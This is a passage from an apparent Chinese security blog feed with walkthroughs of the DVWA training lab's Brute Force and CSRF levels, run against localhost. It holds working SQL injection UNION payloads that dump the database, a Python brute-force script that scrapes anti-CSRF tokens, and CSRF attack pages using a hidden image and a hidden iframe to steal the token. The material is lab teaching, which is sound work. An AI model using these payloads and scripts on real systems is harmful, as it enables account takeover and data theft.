</figure><p>登录成功</p><p>也可以输入admin’#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>同样登录成功</p><p>如果要获取admin的密码信息，我们可以继续注入</p><p>因为服务器限制了查询结果返回的行数只能为1，所以要获取信息，我们必须能让$user值在数据库中不存在</p><p>任意输入username值为 0‘# 测试不存在该用户名</p><p>因为这里有返回信息，我们可以考虑用较为简单的联合查询注入</p><p>那么首先我们就必须知道查询的列数，输入admin’ order by 9#发现报错</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>所以查询列数为8</p><p>接下来就是找获取有效信息的位置，我们输入0’ union select 1,2,3,4,5,6,7,8#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>从页面上看是获取不到我们需要的信息，因为图片加载不出来，但是我们可以从源代码看</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>有效信息在6所处的位置，因此我们在6的位置开始注入</p><p>首先爆库</p><p>输入0’ union select 1,2,3,4,5,database(),7,8#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>接着爆表</p><p>输入0’ union select 1,2,3,4,5,(select group_concat(table_name) from information_schema.tables where table_schema=database()),7,8#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再来爆列</p><p>输入0’ union select 1,2,3,4,5,(select group_concat(column_name) from information_schema.columns where table_name=’users’),7,8#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>最后爆数据</p><p>输入0’ union select 1,2,3,4,5,(select password from users where user=’admin’),7,8#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>但是这里获取到的密码经过md5加密，md5又属于单向加密技术，所以这个密码并没有实际的用处</p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;../sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;Login&apos;]))&#123;</span><br><span class="line">$user=$_GET[&apos;username&apos;];</span><br><span class="line">$user=mysql_real_escape_string($user);</span><br><span class="line">$pass=$_GET[&apos;password&apos;];</span><br><span class="line">$pass=mysql_real_escape_string($pass);</span><br><span class="line">$pass=md5($pass);</span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE user=&apos;$user&apos; AND password=&apos;$pass&apos;&quot;;</span><br><span class="line">$result=mysql_query($sql) or die(mysql_error());</span><br><span class="line">if($result &amp;&amp; mysql_num_rows($result) == 1)&#123;</span><br><span class="line">$avatar=mysql_result($result,0,&apos;avatar&apos;);</span><br><span class="line">echo &quot;&lt;p&gt;Welcome to the password protected area $user&lt;/p&gt;&quot;; </span><br><span class="line">echo &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">sleep(2);</span><br><span class="line">echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>相对于上一关，这关对$user和$pass进行了mysql_real_escape的转义处理，预防了sql注入</p><p>并且登录失败时会sleep 2秒</p><p>虽然预防了sql注入，但是依然可以利用burp爆破密码，跟上一关一样就不演示了</p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;Login&apos;]))&#123;</span><br><span class="line">//CheckAnti-CSRFtoken</span><br><span class="line">checkToken($_REQUEST[&apos;user_token&apos;],$_SESSION[&apos;session_token&apos;],&apos;index.php&apos;);</span><br><span class="line"></span><br><span class="line">//Sanitiseusernameinput</span><br><span class="line">$user=$_GET[&apos;username&apos;];</span><br><span class="line">$user=stripslashes($user);</span><br><span class="line">$user=mysql_real_escape_string($user);</span><br><span class="line"></span><br><span class="line">//Sanitisepasswordinput</span><br><span class="line">$pass=$_GET[&apos;password&apos;];</span><br><span class="line">$pass=stripslashes($pass);</span><br><span class="line">$pass=mysql_real_escape_string($pass);</span><br><span class="line">$pass=md5($pass);</span><br><span class="line"></span><br><span class="line">//Checkdatabase</span><br><span class="line">$query=&quot;SELECT*FROM`users`WHEREuser=&apos;$user&apos;ANDpassword=&apos;$pass&apos;;&quot;;</span><br><span class="line">$result=mysql_query($query)or die(&apos;&lt;pre&gt;&apos;.mysql_error().&apos;&lt;/pre&gt;&apos;);</span><br><span class="line"></span><br><span class="line">if($result&amp;&amp;mysql_num_rows($result)==1)&#123;</span><br><span class="line">//Getusersdetails</span><br><span class="line">$avatar=mysql_result($result,0,&quot;avatar&quot;);</span><br><span class="line"></span><br><span class="line">//Loginsuccessful</span><br><span class="line">echo&quot;&lt;p&gt;Welcometothepasswordprotectedarea&#123;$user&#125;&lt;/p&gt;&quot;;</span><br><span class="line">echo&quot;&lt;imgsrc=&quot;&#123;$avatar&#125;&quot;/&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">//Loginfailed</span><br><span class="line">sleep(rand(0,3));</span><br><span class="line">echo&quot;&lt;pre&gt;&lt;br/&gt;Usernameand/orpasswordincorrect.&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//GenerateAnti-CSRFtoken</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>加入了token验证机制，我们每次登录时都必须提交一个token值，服务器将提交的token值与cookie或session中的token值对比，若不同则拦截下来，也就是说用之前burp爆破密码的方法是行不通的</p><p>还利用了mysql_real_escape_string函数对$user和$pass进行了转义处理，防止了sql注入</p><p>这里我们要想登录，就必须获取到token值，这关利用python脚本进行爆破</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://127.0.0.1/dvwa/vulnerabilities/brute/"</span></span><br><span class="line">header=&#123;</span><br><span class="line"><span class="string">'Host'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line"><span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span>,</span><br><span class="line"><span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36'</span>,</span><br><span class="line"><span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'</span>,</span><br><span class="line"><span class="string">'Referer'</span>: <span class="string">'http://127.0.0.1/dvwa/vulnerabilities/brute/'</span>,</span><br><span class="line"><span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line"><span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9'</span>,</span><br><span class="line"><span class="string">'Cookie'</span>: <span class="string">'security=high; PHPSESSID=842n4cnel00gbrkd5mi9fk98f6'</span>,</span><br><span class="line"><span class="string">'Connection'</span>: <span class="string">'close'</span></span><br><span class="line">&#125;</span><br><span class="line">file=open(<span class="string">'pass.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">    line=line.strip()</span><br><span class="line">    s=requests.Session()</span><br><span class="line">    r=s.get(url,headers=header)</span><br><span class="line">    soup=BeautifulSoup(r.text,<span class="string">'html.parser'</span>)</span><br><span class="line">    user_token=soup.find_all(<span class="string">'input'</span>)[<span class="number">3</span>][<span class="string">'value'</span>]</span><br><span class="line">    payload=&#123;</span><br><span class="line">        <span class="string">'username'</span>:<span class="string">'admin'</span>,</span><br><span class="line">        <span class="string">'password'</span>:line,</span><br><span class="line">        <span class="string">'user_token'</span>:user_token,</span><br><span class="line">        <span class="string">'Login'</span>:<span class="string">'Login'</span></span><br><span class="line">        &#125;</span><br><span class="line">    html=s.get(url,params=payload,headers=header)</span><br><span class="line">    length=len(html.text)</span><br><span class="line">    print(<span class="string">'user_token:'</span>+user_token+<span class="string">'username:admin password:'</span>+line+<span class="string">' length:'</span>+str(length))</span><br></pre></td></tr></table></figure><p>思路是首先读取文件中一个个猜测的密码，这里只用10个密码进行模拟，然后创建一个会话记录，用于保政访问页面的token值不发生变化，然后利用BeautifulSoup库的find_all方法获取所有input标签组成的列表，带有token值的input标签在列表的第三个元素，然后将value属性的值，也就是token值取出，这就获得了token值，然后再将各个参数通过get形式传递给服务器，最终比较返回页面的长度，正常而言，输入正确和失败返回的页面长度是不同的，所以众多猜测密码中，只有一个密码返回的页面长度是不同的，那个密码就可能是正确的密码</p><p>这里还应当注意，应先用burp抓包获取访问登录页面的请求头，否则脚本每次访问的都是dvwa一开始的登录页面</p><p>脚本执行结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Brute-Force/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看出password的返回长度跟其他不同，在登录页面输入，登录成功</p>]]></content>
    
    <summary type="html">
    
      dvwa-Brute Force
    
    </summary>
    
      <category term="dvwa-Brute Force" scheme="https://Foxgrin.github.io/categories/dvwa-Brute-Force/"/>
    
    
      <category term="Brute Force" scheme="https://Foxgrin.github.io/tags/Brute-Force/"/>
    
  </entry>
  
  <entry>
    <title>dvwa-CSRF</title>
    <link href="https://Foxgrin.github.io//posts/48103/"/>
    <id>https://Foxgrin.github.io//posts/48103/</id>
    <published>2018-07-13T06:26:00.000Z</published>
    <updated>2018-07-13T16:32:30.852Z</updated>
    
    <content type="html"><![CDATA[<p>总结了dvwa中关于跨网站请求伪造的一些关卡<a id="more"></a></p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>代码复现如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connection.php"</span>);</span><br><span class="line"></span><br><span class="line">$pass_new=$_GET[<span class="string">'password_new'</span>];</span><br><span class="line">$pass_conf=$_GET[<span class="string">'password_conf'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'password_new'</span>] == $_GET[<span class="string">'password_conf'</span>])&#123;</span><br><span class="line">$pass_new=mysql_real_escape_string($pass_new);</span><br><span class="line">$pass_new=md5($pass_new);</span><br><span class="line">$username=$_COOKIE[<span class="string">'Username'</span>];</span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"UPDATE users SET password='$pass_new' WHERE user='$username'"</span>;</span><br><span class="line">$result=mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Your password has changed"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Password didn't match"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>从源代码可以看出，这是一个修改密码的程序，而$username是取决于中cookie的Username字段值，也就是说，当我们以一个用户身份登录时，服务器会将用户的信息保存在cookie中，下次访问时，就不需要再登录，浏览器直接按之前保存的身份信息登录。这就可能导致了一种CSRF（Cross-site request forgery,跨网站请求伪造）的漏洞，因为修改的密码都是以GET的形式发送给服务器，所以攻击者可以伪造一个url，诱导受害者去点击，受害者一旦点击，如果浏览器之前保存了身份认证信息，用户的密码就会被恶意修改，它与XSS的区别在于，它并没有盗取用户的cookie，而是直接利用用户的cookie，从而完成非法操作。</p><p>构造链接：</p><p>(1)最基础的链接：<a href="http://127.0.0.1/demo/CSRF/low-change.php?password_new=hack&amp;password_conf=hack&amp;change=change" target="_blank" rel="noopener">http://127.0.0.1/demo/CSRF/low-change.php?password_new=hack&amp;password_conf=hack&amp;change=change</a></p><p>当受害者点击了这个链接，他的密码直接就会被修改成hack</p><p>但是这种链接简单直白的告诉了稍微看得懂一点url的人…很明显的就是想篡改他的密码，也就只能骗一骗那些完全不懂的小白</p><p>需要注意的是，CSRF最关键的就是利用用户的cookie向服务器发送伪造请求，也就是说，如果浏览器未保存用户的身份信息，那受害者点击链接时就会自动进入登录界面，攻击就失效了</p><p>有保存用户信息的浏览器，比如Chrome浏览器</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-CSRF/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>Chrome的检查功能可以很明显的看到保存了cookie信息</p><p>而有些浏览器未能保存cookie信息，CSRF攻击就实现不了</p><p>(2)构造短链接</p><p>利用百度短网址系统将网址缩短成一个短网址</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-CSRF/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>由于是本地搭的环境，所以生成不了，实际场景下目标服务器不是域名的话是可以生成短链接的</p><p>这种方法虽然链接看起来不像是攻击链接，但是受害者依然能看到修改密码成功的提示信息</p><p>(3)构造攻击页面</p><p>为了能让用户点击攻击链接，又能不让用户察觉到自己的密码被修改了，我们可以构造一个页面，里面包含了攻击链接，让用户去点击</p><p>我们写一个test.html</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;http://127.0.0.1/demo/CSRF/low-change.php?password_new=hack&amp;password_conf=hack&amp;change=change&quot; style=&quot;display:none&quot;&gt;</span><br><span class="line">&lt;h1&gt;404&lt;/h1&gt;</span><br><span class="line">&lt;h2&gt;file not found.&lt;/h2&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>当受害者访问这个页面时，一个看不见的图片标签就自动访问了修改密码的页面，受害者还误以为自己访问了一个失效的url，实际上自己的密码已经被修改为了hack</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-CSRF/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;../sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;change&apos;]))&#123;</span><br><span class="line">if(eregi($_SERVER[&apos;SERVER_NAME&apos;],$_SERVER[&apos;HTTP_REFERER&apos;]))&#123;</span><br><span class="line">$pass_new=$_GET[&apos;password_new&apos;];</span><br><span class="line">$pass_conf=$_GET[&apos;password_conf&apos;];</span><br><span class="line">$username=$_COOKIE[&apos;Username&apos;];</span><br><span class="line"></span><br><span class="line">if($pass_new == $pass_conf)&#123;</span><br><span class="line">$pass_new=mysql_real_escape_string($pass_new);</span><br><span class="line">$pass_new=md5($pass_new);</span><br><span class="line">$sql=&quot;UPDATE users SET password=&apos;$pass_new&apos; WHERE user=&apos;$username&apos;&quot;;</span><br><span class="line">$result=mysql_query($sql) or die(mysql_error());</span><br><span class="line">echo &quot;Your password has changed&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;Password didn&apos;t match&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;That request didn&apos;t look correct&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>与上一关的区别在于这里加了一个过滤条件，首先先查一下eregi函数的用法</p><p>eregi(string pattern,string string):在一个字符串string中搜索指定模式pattern的字符串，不分大小写，如果匹配成功则返回true，不成功则返回false</p><p>再查阅一下全局变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[&apos;SERVER_NAME&apos;]:http包头的Host参数，即要访问的主机名</span><br><span class="line">$_SERVER[&apos;HTTP_REFERER&apos;]:http包头的Referer参数的值，表示来源地址</span><br></pre></td></tr></table></figure><p>看完不理解也没事，我们利用burp抓包看一下就大概明白了</p><p>我们先在提交的表单中输入password为hack</p><p>然后点击提交</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-CSRF/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>然后用burp抓包</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-CSRF/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>Host值就是要访问的主机名，Referer值就是来源地址</p><p>这是在网页中的表单中提交数据，所以来源地址是这个网页的地址</p><p>我们最终访问主机名一定是127.0.0.1,所以127.0.0.1一定要出现在Referer值中，这起到了一定的过滤作用，如果受害者访问我们伪造的攻击网站，攻击网站向服务器发出伪造请求，会被服务器检测来源地址，地址中不带127.0.0.1的话，就会被过滤掉，但是这种过滤很好解决，即使不理解上面两个参数的意思，我们只要用burp修改请求头的Host和Referer参数，让两个参数都带有一样的内容就ok了</p><p>我们在浏览器中访问<a href="http://127.0.0.1/demo/CSRF/medium-change.php?password_new=hack&amp;password_conf=hack&amp;change=change" target="_blank" rel="noopener">http://127.0.0.1/demo/CSRF/medium-change.php?password_new=hack&amp;password_conf=hack&amp;change=change</a></p><p>然后用burp抓包</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-CSRF/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>我们看到请求头中只有Host参数，没有Referer参数，这是因为我们是在空白的页面访问的，所以没有来源地址，这时候点击go</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-CSRF/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现请求被过滤了</p><p>我们在请求头中添加Referer参数，随便输入一个带127.0.0.1的值</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-CSRF/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>添加Referer参数后修改密码成功</p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &apos;Change&apos; ] ) ) &#123; </span><br><span class="line">    // Check Anti-CSRF token </span><br><span class="line">    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); </span><br><span class="line"></span><br><span class="line">    // Get input </span><br><span class="line">    $pass_new  = $_GET[ &apos;password_new&apos; ]; </span><br><span class="line">    $pass_conf = $_GET[ &apos;password_conf&apos; ]; </span><br><span class="line"></span><br><span class="line">    // Do the passwords match? </span><br><span class="line">    if( $pass_new == $pass_conf ) &#123; </span><br><span class="line">        // They do! </span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">        $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">        // Update the database </span><br><span class="line">        $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; </span><br><span class="line">        $result = mysql_query( $insert ) or die( &apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; ); </span><br><span class="line"></span><br><span class="line">        // Feedback for the user </span><br><span class="line">        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        // Issue with passwords matching </span><br><span class="line">        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token </span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这关加入了token认证机制，能非常有效的预防CSRF攻击，它的防御过程如下：</p><p>(1)每当用户登录后会随机产生一段字符串，并且存储在Session或者Cookie中</p><p>(2)在敏感操作中加入隐藏标签，value即为Session中保存的字符串，如本关中的表单加入了隐藏标签，提交的内容就是Session中保存的字符串</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-CSRF/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>(3)用户提交请求后，服务器将请求提交的Token字符串与Session中的字符串进行比较，如果一致，则认为是正常请求，否则可能是CSRF攻击</p><p>(4)更新Token值</p><p>所以，要绕过Token认证，就必要想办法获得存储在Session或者Cookie当中的Token值</p><p>破解token认证思路是在攻击页面上利用隐藏的iframe框架访问修改密码的页面，然后用javascript代码获取页面token值再赋值给攻击页面表单，再模拟提交隐藏表单</p><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;high-attack&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">function attack()</span><br><span class="line">&#123;</span><br><span class="line">document.getElementsByName(&apos;user_token&apos;)[0].value=document.getElementById(&apos;hack&apos;).contentWindow.document.getElementsByName(&apos;user_token&apos;)[0].value;</span><br><span class="line">document.getElementById(&apos;transfer&apos;).submit();</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;http://127.0.0.1/dvwa/vulnerabilities/csrf/&quot; id=&apos;hack&apos; border=&apos;0&apos; style=&apos;display:none&apos;&gt;</span><br><span class="line">&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;body onload=&quot;attack()&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;form id=&quot;transfer&quot; method=&apos;get&apos; action=&quot;http://127.0.0.1/dvwa/vulnerabilities/csrf/&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;user_token&quot; value=&quot;&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span 